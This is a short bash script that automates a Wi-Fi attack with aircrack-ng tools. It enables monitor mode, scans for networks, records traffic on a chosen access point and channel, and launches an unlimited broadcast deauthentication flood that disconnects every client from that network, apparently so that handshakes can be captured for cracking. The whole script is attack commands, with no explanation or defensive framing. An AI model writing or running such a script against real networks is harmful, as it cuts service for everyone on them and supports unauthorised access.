#!/bin/bash
clear
echo Interface:
read interface
airmon-ng start $interface
airmon-ng check kill
echo Monitor Mode:
read mon
airodump-ng $mon
echo BSSID
read bid
echo $bid
echo Channel
read chnl
client=FF:FF:FF:FF:FF:FF
airodump-ng --ig -w cap -c $chnl --bssid $bid $mon & sleep 6 &&
xterm -hold -e "aireplay-ng --ig --deauth 0 -a $bid -c $client $mon"
sleep 4
clear